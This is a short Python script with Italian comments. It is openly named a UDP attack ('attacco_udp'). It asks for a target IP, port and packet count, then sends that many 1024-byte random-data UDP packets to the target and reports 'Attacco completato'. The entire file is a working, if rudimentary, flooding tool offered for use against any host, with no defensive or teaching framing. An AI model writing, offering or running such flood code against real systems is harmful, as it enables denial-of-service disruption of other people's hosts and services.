import socket  # Libreria necessaria per connessioni di rete
import random  # Librearia che genera dati casuali
import time    # Per gestire le pause


def genera_dati_casuali(dimensione):
    return bytes(random.getrandbits(8) for _ in range(dimensione))


def attacco_udp(ip_destinazione, porta_destinazione, numero_pacchetti):
    dimensione_pacchetto = 1024  
    socket_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  

    pacchetto = genera_dati_casuali(dimensione_pacchetto)  

    print(f"Inizio invio pacchetti a {ip_destinazione}:{porta_destinazione}. Numero di pacchetti: {numero_pacchetti}")

    for i in range(numero_pacchetti):
        socket_udp.sendto(pacchetto, (ip_destinazione, porta_destinazione))  
        print(f"Pacchetto {i + 1} inviato")  
        time.sleep(0.01)  

    socket_udp.close()  
    print("Attacco completato")


ip_target = input("Inserisci l'IP di destinazione: ")  
porta_target = int(input("Inserisci la porta di destinazione: "))  
numero_pacchetti = int(input("Inserisci il numero di pacchetti da inviare: "))  

attacco_udp(ip_target, porta_target, numero_pacchetti)  